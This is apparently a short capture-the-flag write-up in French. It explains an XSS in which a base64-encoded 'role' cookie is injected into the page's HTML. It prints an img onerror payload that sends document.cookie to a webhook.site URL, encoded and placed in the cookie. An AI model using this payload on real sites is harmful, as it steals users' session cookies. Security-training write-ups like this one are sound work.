# Write-up :  5-6-7 - Mac is smart

Ici on a une XSS via le cookie `role` qui est injecté dans le code HTML de la page.
Le role est encodé en base64, et il faut donc encoder notre payload en base64 pour qu'il soit exécuté.

On peut remplacer rôle par 
```html
<img src="x" onerror="fetch('https://webhook.site/uid?c='+document.cookie)"/>
```
On le met en base64 et on l'injecte dans le cookie `role`